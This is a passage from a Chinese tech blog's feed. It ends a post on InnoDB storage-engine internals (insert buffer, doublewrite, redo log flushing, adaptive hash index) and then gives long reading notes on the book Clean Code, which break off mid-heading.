我们都知道，在InnoDB引擎上进行插入操作时，一般需要按照主键顺序进行插入，这样才能获得较高的插入性能。当一张表中存在非聚簇的且不唯一的索引时，在插入时，数据页的存放还是按照主键进行顺序存放，但是对于非聚簇索引叶节点的插入不再是顺序的了，这时就需要离散的访问非聚簇索引页，由于随机读取的存在导致插入操作性能下降。</p><p> InnoDB为此设计了Insert Buffer来进行插入优化。对于非聚簇索引的插入或者更新操作，不是每一次都直接插入到索引页中，而是先判断插入的非聚集索引是否在缓冲池中，若在，则直接插入；若不在，则先放入到一个Insert Buffer中。看似数据库这个非聚集的索引已经查到叶节点，而实际没有，这时存放在另外一个位置。然后再以一定的频率和情况进行Insert Buffer和非聚簇索引页子节点的合并操作。这时通常能够将多个插入合并到一个操作中，这样就大大提高了对于非聚簇索引的插入性能。</p><h2 id="两次写-Double-Write"><a href="#两次写-Double-Write" class="headerlink" title="两次写(Double Write)"></a>两次写(Double Write)</h2><p>用来处理部分写问题：<br>目前大部分服务器使用4K或512B来格式化磁盘，而Innodb存储引擎使用默认16K的数据页，在写入16KB数据页时，可能存在页面部分数据写入到磁盘便发生宕机的情况，该问题被称为部分写失效(Partial page write)</p><p>如果说Insert Buffer给InnoDB存储引擎带来了性能上的提升，那么Double Write带给InnoDB存储引擎的是数据页的可靠性。</p><p>Double Write由两部分组成，一部分是内存中的double write buffer，大小为2MB，另一部分是物理磁盘上共享表空间连续的128个页，大小也为2MB。在对缓冲池的脏页进行刷新时，并不直接写磁盘，而是通过memcpy函数将脏页先复制到内存中的该区域，之后通过doublewrite buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免操作系统缓冲写带来的问题。在完成doublewrite页的写入后，再讲doublewirite buffer中的页写入各个表空间文件中。</p><p> 如果操作系统在将页写入磁盘的过程中发生了崩溃，在恢复过程中，InnoDB存储引擎可以从共享表空间中的doublewrite中找到该页的一个副本，将其复制到表空间文件中，再应用重做日志。</p><h2 id="重做日志-Redo-Log-Buffer"><a href="#重做日志-Redo-Log-Buffer" class="headerlink" title="重做日志(Redo Log Buffer)"></a>重做日志(Redo Log Buffer)</h2><p> 当缓冲池中的页的版本比磁盘要新时，数据库需要将新版本的页从缓冲池刷新到磁盘。但是如果每次一个页发送变化，就进行刷新，那么性能开发是非常大的，于是InnoDB采用了Write Ahead Log策略，即当事务提交时，先写重做日志，然后再择时将脏页写入磁盘。如果发生宕机导致数据丢失，就通过重做日志进行数据恢复。</p><p> InnoDB存储引擎会首先将重做日志信息先放入重做日志缓冲中，然后再按照一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置得很大，因为一般情况每一秒钟都会将重做日志缓冲刷新到日志文件中。可通过配置参数innodb_log_buffer_size控制，默认为8MB。</p><p> 除了每秒刷新机制之外，每次事务提交时重做日志缓冲也会刷新到日志中。InnoDB是事务的存储引擎，其通过Force Log at Commit机制实现事务的持久性，即当事务提交时，必须先将该事务的所有日志写入到重做日志文件进行持久化，然后事务的提交操作完成才算完成。</p><p> 为了确保每次日志都写入到重做日志文件，在每次讲重做日志缓冲写入重做日志后，必须调用一次fsync操作，将缓冲文件从文件系统缓存中真正写入磁盘。</p><p> 可以通过innodb_flush_log_at_trx_commit来控制重做日志刷新到磁盘的策略。该参数默认值为1，表示事务提交必须进行一次fsync操作，还可以设置为0和2。0表示事务提交时不进行写入重做日志操作，该操作只在主线程中完成，2表示提交时写入重做日志，但是只写入文件系统缓存，不进行fsync操作。由此可见，设置为0时，性能最高，但是丧失了事务的一致性。</p><h2 id="自适应哈希索引-Adaptive-Hash-Index"><a href="#自适应哈希索引-Adaptive-Hash-Index" class="headerlink" title="自适应哈希索引(Adaptive Hash Index)"></a>自适应哈希索引(Adaptive Hash Index)</h2><p> InnoDB会根据访问的频率和模式，为热点页建立哈希索引，来提高查询效率。InnoDB存储引擎会监控对表上各个索引页的查询，如果观察到建立哈希索引可以带来速度上的提升，则建立哈希索引，所以叫做自适应哈希索引。</p><p> 自适应哈希索引是通过缓冲池的B+树页构建而来，因此建立速度很快，而且不需要对整张数据表建立哈希索引。其有一个要求，即对这个页的连续访问模式必须是一样的，也就是说其查询的条件(WHERE)必须完全一样，而且必须是连续的。</p><h2 id="锁信息-lock-info"><a href="#锁信息-lock-info" class="headerlink" title="锁信息(lock info)"></a>锁信息(lock info)</h2><p>InnoDB存储引擎会在行级别上对表数据进行上锁。不过InnoDB也会在数据库内部其他很多地方使用锁，从而允许对多种不同资源提供并发访问。数据库系统使用锁是为了支持对共享资源进行并发访问，提供数据的完整性和一致性。<br><img src="/upload/2022/08/image-3bb07c7ee79948638b8b4c56287e78c3.png" alt="image.png">关于锁的具体知识可以看这篇博客<br><a href="https://www.cnblogs.com/huangfuyuan/p/9510022.html">https://www.cnblogs.com/huangfuyuan/p/9510022.html</a></p><h2 id="数据字典信息-Data-Dictionary"><a href="#数据字典信息-Data-Dictionary" class="headerlink" title="数据字典信息(Data Dictionary)"></a>数据字典信息(Data Dictionary)</h2><p> InnoDB有自己的表缓存，可以称为表定义缓存或者数据字典。当InnoDB打开一张表，就增加一个对应的对象到数据字典。</p><p> 数据字典是对数据库中的数据、库对象、表对象等的元信息的集合。在MySQL中，数据字典信息内容就包括表结构、数据库名或表名、字段的数据类型、视图、索引、表字段信息、存储过程、触发器等内容。MySQL INFORMATION_SCHEMA库提供了对数据局元数据、统计信息、以及有关MySQL server的访问信息（例如：数据库名或表名，字段的数据类型和访问权限等）。该库中保存的信息也可以称为MySQL的数据字典。</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《代码整洁之道》读书笔记</title>
    <link href="/2023/06/18/%E3%80%8A%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/06/18/%E3%80%8A%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这本书给我的启发很大，主要是让我明白了代码应该如何去写，怎样写出维护性好的代码，其中涉及到很多需要注意的地方，必须用笔记记下来以免未来遗忘，但内容太多懒得打字，这一份读书笔记是直接拷贝的他人的，原文链接：<a href="https://zhuanlan.zhihu.com/p/37639722">https://zhuanlan.zhihu.com/p/37639722</a></p><h2 id="一、整洁代码"><a href="#一、整洁代码" class="headerlink" title="一、整洁代码"></a>一、整洁代码</h2><p>A.混乱的代价<br>1.有些团队在项目初期进展迅速，但有那么一两年的时间却慢去蜗行。对代码的每次修改都影响到其他两三处代码<br>2.花时间保持代码整洁不但有关效率，还有关生存<br>3.程序员遵从不了解混乱风险经理的意愿，也是不专业的做法<br>4.Bjarne Stroustrup，C++发明者：我喜欢优雅和高效的代码。代码逻辑应该直接了当，叫缺陷难以隐藏；尽量减少依赖关系，使之便于维护；依据某种分层战略完善错误处理代码；性能调至最优，省得引诱别人做没规矩的优化，搞出一堆混乱来。整洁的代码只做好一件事。<br>5.Grady Booch，《面向分析与设计》：整洁的代码简单直接。整洁的代码如同优美的散文。整洁的代码从不隐藏设计者的意图，充满了干净利落的抽象和直接了当的控制语句。<br>6.Dave Thomas，OTI公司创始人：整洁的代码应可由作者之外的开发者阅读和增补。它应有单元测试和验收测试。它使用有意义的命名。它只提供一种而非多种做一件事的途径。它只有尽量少的依赖关系，而且要明确地定义和提供清晰、尽量少的API。代码应通过其字面表达含义，因为不同的语言导致并非所有必须信息均可通过代码自身清晰表达。<br>7.Michael Feathers，《修改代码的艺术》：我可以列出我留意到的整洁代码的所有特点，但其中有一条是根本性的。整洁的代码总是看起来像是某位特别在意它的人写的。几乎没有改进的余地。代码作者什么都想到了，如果你企图改进它，总会回到原点，赞叹某人留给你的代码——全心投入的某人留下的代码。<br>8.Ron Jeffries，《极限编程实施》：简单代码，依其重要顺序：能通过所有测试；没有重复代码；体现系统中的全部设计理念；包括尽量少的实体，比如类、方法、函数等<br>9.Ward Cunningham，Wiki发明者：如果每个例程都让你感到深合已意，那就是整洁代码。如果代码让编程语言看起来像是专为解决那个问题而存在，就可以称之为漂亮的代码。</p><p>B.思想流派<br>1.读与写花费时间的比例起过10:1</p><p>C.童子军军规<br>1.“让营地比你来时更干净”<br>2.如果每次签入时，代码都比签出时干净，那么代码就不会腐坏</p><h2 id="二、有意义的命名"><a href="#二、有意义的命名" class="headerlink" title="二、有意义的命名"></a>二、有意义的命名</h2><p>A.名副其实<br>1.变量、函数或类的名称应该已经答复了所有的大问题，如果名称需要注释来补充，那就不算名副其实<br>2.代码的模糊度：即上下文在代码中未被明确体现的程度</p><p>B.避免误导<br>1.程序员必须避免留下掩藏代码本意的错误线索。应当避免使用与本意相悖的词<br>2.以同样的方式拼写出同样的概念才是信息，拼写前后不一致就是误导<br>3.要注意使用小写字母i和大写字母O作为变量名，看起来像“壹”和“零”</p><p>C.做有意义的区分<br>1.同一作用范围内两样不同的东西不能重名，如果名称必须相异，那其意思也应该不同才对<br>2.废话是另一种没意义的区分。假设你有一个Product类，如果还有一个ProductInfo或ProductData类，那它们的名称虽然不同，意思却无区别<br>3.只要体现出有意义的区分，使用a和the这样的前缀就没错<br>4.废话都是冗余。Variable一词记录不应当出现在变量名中，Table一词永远不应当出现在表名中</p><p>D.使用读得出来的名称</p><p>E.使用可搜索的名称<br>1.单字母名称和数字常量有个问题，就是很难在一大篇文字中找出来</p><p>F.避免使用编码<br>1.把类型或作用域编进名称里面，徒然增加了解码的负担<br>2.也不必用m_前缀来标明成员变量，应当把类和函数做得足够小，消除对成员前缀的需要<br>3.不加修饰的接口，不要用前导字母I</p><p>G.避免思维映射<br>1.不应当让读者在脑中把你的名称翻译为他们熟知的名称，单字母变量名就是个问题<br>2.专业程序员了解，明确是王道</p><p>H.类名<br>1.类名和对象名应该是名词或名词短语，类名不应当是动词</p><p>I.方法名<br>1.方法名应该是动词或动词短语。属性访问器、修改器和断言应该根据其值命名，并依Javabean标准加上get、set和is前缀<br>2.可以考虑将相应构造器设置为private，强制使用这种命名手段</p><p>J.别扮可爱<br>1.言到意到，意到言到</p><p>K.别用双关语<br>1.避免将同一单词用于不同目的<br>2.应尽力写出易于理解的代码，把代码写得让别人能一目尽览而不必殚精竭虑地研究</p><p>L.使用解决方案领域名称<br>1.尽管用那些计算机科学术语、算法名、模式名、数学术语</p><p>M.使用源自所涉问题领域的名称<br>1.如果不能用程序员熟悉的术语来给手头的工作命名，就采用从所涉问题领域而来的名称<br>2.优秀的程序员和设计师，其工作之一就是分离解决方案领域和问题领域的概念</p><p>N.添加有意义的语境<br>1.你需要用有良好命名的类、函数或名称空间来放置名称，给读者提供语境<br>2.如果没这么做，给名称添加前缀就是最后一招了</p><p>O.不要添加没用的语境<br>1.只要短名称足够清楚，就要比长名称好</p><p>P.最后的话<br>1.取好名字最难的地方在于需要良好的描述技巧和共有文化背景</p><h2 id="三、函数"><a href="#三、函数" class="headerlink" title="三、函数"></a>三、函数</h2><p>A.短小<br>1.函数的第一规则是要短小，第二条规则是还要更短小<br>2.if语句、else语句、while语句等，其中的代码块应该只有一行，该行大抵是一个函数调用语句<br>3.函数不应该大到足以容纳嵌套结构，所以，函数的缩进层级不该多于一层或两层</p><p>B.只做一件事<br>1.函数应该做一件事。做好这件事，只做这一件事<br>2.要判断函数是否不止做了一件事，就是看看是否能再拆出一个函数，该函数不仅只是单纯地重新诠释其实现<br>3.只做一件事的函数无法被合理地切分为多个区段</p><p>C.每个函数一个抽象层级<br>1.要确保函数只做一件事，函数中的语句都要在同一抽象层级上<br>2.自顶向下读代码：向下规则，让代码拥有自顶向下的阅读顺序，让每个函数后面都跟着下一抽象层级的函数</p><p>D.switch语句<br>1.写出短小的switch语句很维，写出只做一件事的switch语句也很难，Switch天生要做N件事<br>2.将switch语句埋到抽象工厂底下，不让任何人看到<br>3.如果只出现一次，用于创建多态对象，而且隐藏在某个继承关系中，在系统其他部分看不到，就还能容忍</p><p>E.使用描述性的名称<br>1.沃德原则：“如果每个例程都让你感到深合已意，那就是整洁代码”<br>2.函数越短小，功能越集中，就越便于取个好名字<br>3.别害怕长名称，长而具有描述性的名称，要比短而令人费解的名称好<br>4.命名方式要保持一致。使用与模块名一脉相承的短语、名词和动词给函数命名</p><p>F.函数参数<br>1.最理想的参数数量是零，有足够的理由才能用三个以上参数<br>2.事件：在这种形式中，有输入参数而无输出参数，程序将函数看作一个事件，使用该参数修改系统状态<br>3.对于转换，使用输出参数而非返回值令人迷惑，如果函数要对输入参数进行转换操作，转换结果就该体现为返回值<br>4.向函数传入布尔值会使方法签名立刻变得复杂起来，大声宣布函数不止做一件事<br>5.如果函数看来需要两个、三个或三个以上参数，就说明其中一些参数应该封装为类了<br>6.有可变参数的函数可能是一元、二元甚至三元，超过这个数量就可能要犯错了<br>7.对于一元函数，函数和参数应当形成一种非常良好的动词&#x2F;名词对形式</p><p>G.无副作用<br>1.函数承诺只做一件事，但还是会做其他被藏起来的事，会导致古怪的时序性耦合及顺序依赖<br>2.参数多数会被自然而希地看作是函数的输入</p><p>H.分隔指令与询问<br>1.函数要么做什么事，要么回答什么事，但二者不可得兼</p><p>I.使用异步替代返回错误码<br>1.从指令式函数返回错误码轻微违反了指令与询问分隔的规则。它鼓励了在if语句判断中把指令当作表达式使用<br>2.try&#x2F;catch代码块把错误处理与正常流程混为一谈，最好把try和catch代码块的主体部分抽离出来，另外形成函数<br>3.错误处理就是一件事，处理错误的函数不该做其他事<br>4.依赖磁铁（dependency magnet）：其他许多类都得导入和使用它</p><p>J.别重复自己<br>1.重复可能是软件中一切邪恶的根源，许多原则与实践规则都是为控制与消除重复而创建</p><p>K.结构化编程<br>1.每个函数、函数中的每个代码块都应该有一个入口、一个出口。遵循这些规则，意味着在每个函数中只该有一个return语句，循环中不能有break或者continue语句，而且永永远远不能有任何的goto语句<br>2.只有在大函数中这些规则才会有明显好处，因为，只要函数保持短小，偶尔出现的return、break或continue语句没有坏处，goto语句尽量避免</p><p>L.如何写出这样的函数<br>1.打磨代码，分解函数、修改名称、消除重复<br>2.缩短和重新安置方法、拆散类、保持测试通过</p><h2 id="四、注释"><a href="#四、注释" class="headerlink" title="四、注释"></a>四、注释</h2><p>1.若编程语言足够有表达力，就不需要注释<br>2.注释的恰当用法是弥补我们在用代码表达意图时遭遇的失败。注释总是一种失败<br>3.程序员应当负责将注释保持在可维护、有关联、精确的高度，更应该把力气用在写清楚代码上，直接保证无须编写注释<br>4.不准确的注释要比没注释坏得多</p><p>A.注释不能美化糟糕的代码<br>1.带有少量注释的整洁而有表达力的代码，要比带有大量注释的零碎而复杂的代码像样得多<br>2.与其花时间编写解释你搞出的糟糕的代码的注释，不如花时间清洁那堆糟糕的代码</p><p>B.用代码来阐述<br>1.用代码解释你大部分的意图，很多时候，简单到只需要创建一个描述与注释所言同一事物的函数即可</p><p>C.好注释<br>1.法律信息<br>2.提供信息的注释<br>3.对意图的解释：提供某个决定后面的意图<br>4.阐释：注释把某些晦涩难懂的参数或返回值的意义翻译为某种可读形式<br>5.警示<br>6.TODO注释：注意要清理<br>7.放大：放大某种看来不合理之物的重要性<br>8.公共API中的Javadoc</p><p>D.坏注释<br>1.喃喃自语<br>2.多余的注释<br>3.误导性注释<br>4.循规式注释<br>5.日志式注释<br>6.废话注释<br>7.可怕的废话<br>8.能用函数或变量时就别用注释<br>9.位置标记：如果标记栏不多，就会显而易见，所以，尽量少用标记栏，只在特别有价值的时候用<br>10.括号后面的注释<br>11.归属与署名<br>12.注释掉的代码<br>13.HTML注释<br>14.非本地信息<br>15.信息过多<br>16.不明显的联系<br>17.函数头<br>18.非公共代码中的Javadoc<br>19.范例</p><h2 id="五、格式"><a href="#五、格式" class="headerlink" title="五、格式"></a>五、格式</h2><p>A.格式的目的<br>1.代码格式关乎沟通，而沟通是专业开发者的头等大事</p><p>B.垂直格式<br>1.短文件通常比长文件易于理解<br>2.源文件也要像报纸文章那样 ，名称应当简单且一目了然，最顶部应该给出高层次概念和算法，细节应该往下渐次展开<br>3.几乎所有的代码都是从上往下读，从左往右读。每行展现一个表达式或一个子句，每代码行展示一条完整的思路。这些思路用空白行区隔开来。<br>4.如果说空白行隔开了概念，靠近的代码行则暗示了它们之间的紧密关系<br>5.除非有很好的理由，否则就不要把关系密切的概念放到不同的文件中，实际上，这也是避免使用protected变量的理由之一，应避免迫使读者在源文件和类中跳来跳去<br>6.变量声明应尽可能靠近其使用位置，在函数顶部出现，循环的控制变量总是在循环语句中声明<br>7.实体变量在类的顶部声明<br>8.相关函数，若某个函数调用了另外一个，就应该把它们放到一起，而且调用者应该尽可能放在被调用者上面<br>9.概念相关的代码应该放到一起，相关性越强，彼此之间的距离就该越短<br>10.我们想自上向下展示函数调用依赖顺序，被调用的函数应该放在执行调用的函数下面，这就建立了一种自顶向下贯穿源代码模块的良好信息流</p><p>C.横向格式<br>1.尽力保持代码行短小，遵循无需拖动滚动条到右边的原则，最好不超过120个<br>2.我们使用空格字符将彼此紧密相关的事物连接到一起，也用空格字符把相关性较弱的事物分隔开<br>3.对齐，像是在强调不重要的东西，把目光从真正的意义上拉开<br>4.如果有较长的列表需要做对齐处理，那问题就是在列表的长度上而不是对齐上<br>5.程序员相当依赖缩进模式<br>6.有时，while或for语句的语句体为空，如果无法避免，就确保空范围体的缩进，用括号包围起来</p><p>D.团队规则<br>1.一组开发者应当认同一种模式风格，每个成员都应该采用那种风格<br>2.好的软件系统是由一系列读起来不错的代码文件组成的，需要拥有一致和顺畅的风格</p><h2 id="六、对象和数据结构"><a href="#六、对象和数据结构" class="headerlink" title="六、对象和数据结构"></a>六、对象和数据结构</h2><p>A.数据抽象<br>1.隐藏实现关乎抽象，类并不简单地用取值器和赋值器将其变量推向外部，而是曝露抽象接口，以便用户无需了解数据的实现就能操作数据本体</p><p>B.数据、对象的反对称性<br>1.对象把数据隐藏于抽象之后，曝露操作数据的函数。数据结构曝露其数据，并没有提供有意义的函数<br>2.对象与数据结构之间的二分原理：</p><ul><li>过程式代码（使用数据结构的代码）便于在不改动既有数据结构的前提下添加新函数。面向对象代码便于在不改动既有函数的前提下添加新类</li><li>过程式代码难以添加新数据结构，因为必须修改所有函数。面向对象代码难以添加新函数，因为必须修改所有类</li></ul><p>C.得墨忒耳律<br>1.得墨忒耳律（The Law of Demeter）：模块不应了解它所操作对象的内部情形，意味着对象不应通过存取器曝露其内部结构，因为这样更像是曝露而非隐藏其内部结构<br>2.混合结构，一半是对象，一半是数据结构，应避免这种结构</p><p>D.数据传送对象<br>1.最为精练的数据结构，是一个只有公共变量、没有函数的类，这种被称为数据传送对象，或DTO（Data Transfer Objects）。在与数据库通信、或解析套接字传递的消息之类场景中<br>2.JavaBean或Active Record<br>3.不要塞进业务规则方法，把Active Record当做数据结构，并创建包含业务规则、隐藏内部数据（可能就是Active Record的实体）的独立对象</p><h2 id="七、错误处理"><a href="#七、错误处理" class="headerlink" title="七、错误处理"></a>七、错误处理</h2><p>1.错误处理很重要，但如果它搞乱了代码逻辑，就是错误的做法</p><p>A.使用异常而非返回码<br>1.遇到错误时，最好抛出一个异常。调用代码很整洁，其逻辑不会被错误处理搞乱</p><p>B.先写Try-Catch-Finally语句<br>1.异常的妙处之一是，它们在程序中定义了一个范围。执行try-catch-finally语句中try部分的代码时，你是在表明可随时取消执行，并在catch语句中接续<br>2.在某种意义上，try代码块就像是事务，catch代码块将程序维持在一种持续状态<br>3.在编写可能抛出异常的代码时，最好先写try-catch-finally语句，能帮你定义代码的用户应该期待什么，无论try代码块中执行的代码出什么错都一样</p><p>C.使用不可控异常<br>1.可控异常的代价就是违反开放&#x2F;闭合原则，得在catch语句和抛出异常处之间的每个方法签名中声明该异常<br>2.可控异常意味着对软件中较低层级的修改，都将波及较高层级的签名</p><p>D.给出异常发生的环境说明<br>1.抛出的每个异常，都应当提供足够的环境说明，以便判断错误的来源和处所<br>2.应创建信息充分的错误消息，并和异常一起传递出去</p><p>E.依调用者需要定义异常类<br>1.最重要的考虑是它们如何被捕获<br>2.将第三方API打包是个良好的实践手段，降低了对每个第三方的依赖，也有助于模拟第三方调用</p><p>F.定义常规流程<br>1.特例模式（SPECIAL CASE PATTERN,[Fowler]），创建一个类或配置一个对象，用来处理特例，异常行为被封装到特例对象中</p><p>G.别返回null值<br>1.返回null值，基本是在给自己增加工作量，也是在给调用者添乱，只要有一处没检查null值，应用程序就会失控</p><p>H.别传递null值<br>1.将null值传递给其他方法更糟糕，除非API要求你向它传递null值，否则就要尽可能避免传递null值</p><h2 id="八、边界"><a href="#八、边界" class="headerlink" title="八、边界"></a>八、边界</h2><p>A.使用第三方代码<br>1.第三方程序包和框架提供者追求普适性，这样就能在多个环境中工作，吸引广泛的用户<br>2.我们建议不要将Map（或在边界上的其他接口）在系统中传递，把它保留在类或近亲类中，避免从API中返回边界接口，或将接口作为参数传递给公共API</p><p>B.浏览和学习边界</p><p>C.学习性测试的好处不只是免费<br>1.学习性测试毫无成本，编写测试是获得这些知识（要使用的API）的容易而不会影响其他工作的途径<br>2.学习性测试确保第三方程序包按照我们想要的方式工作</p><p>D.使用尚不存在的代码<br>1.编写我们想得到的接口，好处之一是它在我们控制之下，有助于保持客户代码更可读，且集中于它该完成的工作</p><p>E.整洁的边界<br>1.边界上的改动，有良好的软件设计，无需巨大投入和重写即可进行修改<br>2.边界上的代码需要清晰的分割和定义了期望的测试。依靠你能控制的东西，好过依靠你控制不了的东西，免得日后受它控制<br>3.可以使用ADAPTER模式将我们的接口转换为第三方提供的接口</p><h2 id="九、单元测试"><a href="#九、单元测试" class="headerlink" title="九、单元测试"></a>九、单元测试</h2><p>A.TDD三定律<br>1.在编写能通过的单元测试前，不可编写生产代码<br>2.只可编写刚好无法通过的单元测试，不能编译也算不通过<br>3.只可编写刚好足以通过当前失败测试的生产代码</p><p>B.保持测试整洁<br>1.脏测试等同于没测试，测试必须随生产代码的演进而修改，测试越脏，就越难修改<br>2.测试代码和生产代码一样重要，它需要被思考、被设计和被照料，它该像生产代码一般保持整洁<br>3.如果测试不能保持整洁，你就会失去它们，没有了测试，你就会失去保证生产代码可扩展的一切要素</p><p>C.整洁的测试<br>1.三个要素：可读性、可读性和可读性，明确、简洁还有足够的表达力<br>2.构造-操作-检验（BUILD-OPERATE-CHECK）模式，第一个环节构造测试数据，第二个环节操作测试数据，第三个部分检验操作是否得到期望的结果<br>3.守规矩的开发者也将他们的测试代码重构为更简洁和具有表达力的形式</p><p>D.每个测试一个断言<br>1.JUnit中每个测试函数都应该有且只有一个断言语句<br>2.最好的说法是单个测试中的断言数量应该最小化<br>3.更好一些的规则或许是每个测试函数中只测试一个概念<br>4.最佳规则是应该尽可能减少每个概念的断言数量，每个测试函数只测试一个概念</p><p>E.F.I.R.S.T<br>1.快速（Fast）测试应该够快<br>2.独立（Independent）测试应该相互独立<br>3.可重复（Repeatable）测试应当可在任何环境中重复通过<br>4.自足验证（Self-Validating）测试应该有布尔值输出<br>5.及时（Timely）测试应及时编写</p><h2 id="十、类"><a href="#十、类" class="headerlink" title="十、类"></a>十、类</h2><p>A.类的组织<br>1.类应该从一级变量列表开始，如果有公共静态变量，应该先出现，然后是私有静态变量，以及实体变量，很少会有公共变量<br>2.公共函数应该跟在变量列表之后<br>3.保持变量和工具函数的私有性，但并不执着于此</p><p>B.类应该短小<br>1.第一规则是类应该短小，第二规则是还要更短小<br>2.衡量方法，计算权责（responsibility）<br>3.类的名称应当描述其权责，如果无法为某个类命以精确的名称，这个类大概就太长了，类名越含混，该类越有可能拥有过多权责<br>4.单一权责原则（SRP）认为，类或模块应有且只有一条加以修改的理由<br>5.系统应该由许多短小的类而不是少量巨大的类组成，每个小类封装一个权责，只有一个修改的原因，并与少数其他类一起协同达成期望的系统行为<br>6.方法操作的变量越多，就越黏聚到类上，如果一个类的每个变量都被每个方法所使用，则该类具有最大的内聚性<br>7.保持函数和参数列表短小的策略，有时会导致为一组子集方法所用的实体变量数量增加。出现这种情况时，往往意味着至少有一个类要从大类中挣扎出来。你应当尝试将这些变量和方法分拆到两个或多个类中，让新的类更为内聚<br>8.将大函数拆为许多小函数，往往也是将类拆分为多个小类的时机</p><p>C.为了修改而组织<br>1.在整洁的系统中，我们对类加以组织，以降低修改的风险<br>2.开放-闭合原则（OCP）：类应当对扩展开放，对修改封闭<br>3.在理想系统中，我们通过扩展系统而非修改现有代码来添加新特性<br>4.依赖倒置原则（Dependency Inversion Principle,DIP），类应该依赖于抽象而不是依赖于具体细节</p><h2 id="十一、系统"><a href="#十一、系统" class="headerlink" title="十一、系统"></a>十一、系统</h2><p>A.如何建造一个城市<br>1.每个城市都有一组人管理不同的部分，有人负责全局，其他人负责细节<br>2.深化出恰当的抽象等级和模块，好让个人和他们所管理的“组件”即便在不了解全局时也能有效地运转</p><p>B.将系统的构造与使用分开<br>1.构造与使用是非常不一样的过程<br>2.软件系统应将启始过程和启始过程之后的运行时逻辑分离开，在启始过程中构建应用对象，也会存在互相缠结的依赖关系<br>3.将构造与使用分开的方法之一是将全部构造过程搬迁到main或被称为main的模块中，设计系统的其余部分时，假设所有对象都已正确构造和设置<br>4.可以使用抽象工厂模式让应用自行控制何时创建对象，但构造的细节却隔离于应用程序代码之外<br>5.控制反转将第二权责从对象中拿出来，转移到另一个专注于此的对象中，从而遵循了单一权责原则。在依赖管理情景中，对象不应负责实体化对自身的依赖，反之，它应当将这份权责移交给其他“有权力”的机制，从而实现控制的反转</p><p>C.扩容<br>1.“一开始就做对系统”纯属神话，反之，我们应该只去实现今天的用户故事，然后重构，明天再扩展系统、实现新的用户故事，这就是迭代和增量敏捷的精髓所在。测试驱动开发、重构以及它们打造出的整洁代码，在代码层面保证了这个过程的实现<br>2.软件系统与物理系统可以类比。它们的架构都可以递增式的增长，只要我们持续将关注面恰当地切分<br>3.持久化之类关注面倾向于横贯某个领域的天然对象边界</p><p>D.Java代理<br>1.适用于简单情况，例如在单独的对象或类中包装方法调用<br>2.旧式的Java对象（Plain-Old Java Object, POJO）</p><p>E.纯Java AOP框架</p><p>F.AspectJ的方面</p><p>G.测试驱动系统架构<br>1.通过方面式（AOP）的手段切分关注面的威力不可低估。假使你能用POJO编写应用程序的领域逻辑，在代码层面与架构关注面分离开，就有可能真正地用测试来驱动架构<br>2.没必要先做大设计（Big Design Up Front，BDUF），BDUF甚至是有害的，它阻碍改进，因为心理上会抵制丢弃即成之事，也因为架构上的方案选择影响到后续的设计思路<br>3.我们可以从“简单自然”但切分良好的架构开始做软件项目，快速交付可工作的用户故事，随着规模的增长添加更多基础架构<br>4.最佳的系统架构由模块化的关注面领域组成，每个关注面均用纯Java（或其他语言）对象实现，不同的领域之间用最不具有侵害性的方面或类方面工具整合起来，这种架构能测试驱动，就像代码一样</p><p>H.优化决策<br>1.模块化和关注面切分成就了分散化管理和决策<br>2.延迟决策至最后一刻也是好手段，它让我们能够基于最有可能的信息做出选择<br>3.拥有模块化关注面的POJO系统提供的敏捷能力，允许我们基于最新的知识做出优化的、时机刚好的决策，决策的复杂性也降低了</p><p>I.明智使用添加了可论证价值的标准<br>1.有了标准，就更易复用想法和组件、雇用拥有相关经验的人才、封装好点子，以及将组件连接起来。不过，创立标准的过程有时却漫长到行业等不及的程度，有些标准没能与它要服务的采用者的真实需求相结合</p><p>J.系统需要领域特定语言<br>1.领域特定语言（Domain-Specific Language, DSL）是一种单独的小型脚本语言或以标准语言写就的API，领域专家可以用它编写读像是组织严谨的散文一般的代码<br>2.领域特定语言允许所有抽象层级和应用程序中的所有领域，从高级策略到底层细节，使用POJO来表达</p><h2 id="十二、迭进"><a href="#十二、迭进" class="headerlink" title="十二、迭进"></a>十二、迭进</h2><p>A.通过迭进设计达到整洁目的</p><p>1.“简单规则”：</p><ul><li>运行所有测试</li><li>不可重复</li><li>表达了程序员的意图</li><li>尽可能减少类和方法的数量</li><li>以上规则按其重要程序排列</li></ul><p>B.简单设计原则1：运行所有测试<br>1.设计必须制造出如预期一般工作的系统，这是首要因素<br>2.全面测试并持续通过所有测试的系统，就是可测试的系统，不可验证的系统，绝不应部署<br>3.只要系统可测试，就会导向保持类短小且目的单一的设计方案<br>4.紧耦合的代码难以编写测试<br>5.遵循有关编写测试并持续运行测试的简单、明确的规则，系统就会更贴近OO低耦合度、高内聚度的目标，编写测试引致更好的设计</p><p>C.简单设计原则2-4：重构<br>1.有了测试，就能保持代码和类的整洁，方法就是递增式地重构代码<br>2.测试消除了对清理代码就会破坏代码的恐惧</p><p>D.不可重复<br>1.重复是拥有良好设计系统的大敌<br>2.极其雷同的代码行当然是重复，还有实现上的重复等其他一些形态<br>3.“小规模复用”可大量降低系统复杂性，要想实现大规模复用，必须理解如何实现小规模复用<br>4.模板方法模式是一种移除高层级重复的通用技巧</p><p>E.表达力<br>1.软件项目的主要成本在于长期维护，代码应当清晰地表达其作者的意图<br>2.可以通过选用好名称来表达<br>3.可以通过保持函数和类尺寸短小来表达<br>4.可以通过采用标准命名法来表达<br>5.编写良好的单元测试也具有表达性<br>6.做到有表达力的最重要方式是尝试</p><p>F.尽可能少的类和方法<br>1.类和方法的数量太多，有时是由毫无意义的教条主义导致的，应该采用更实用的手段<br>2.目标是在保持函数和类短小的同时，保持整个系统短小精悍</p><h2 id="十三、并发编程"><a href="#十三、并发编程" class="headerlink" 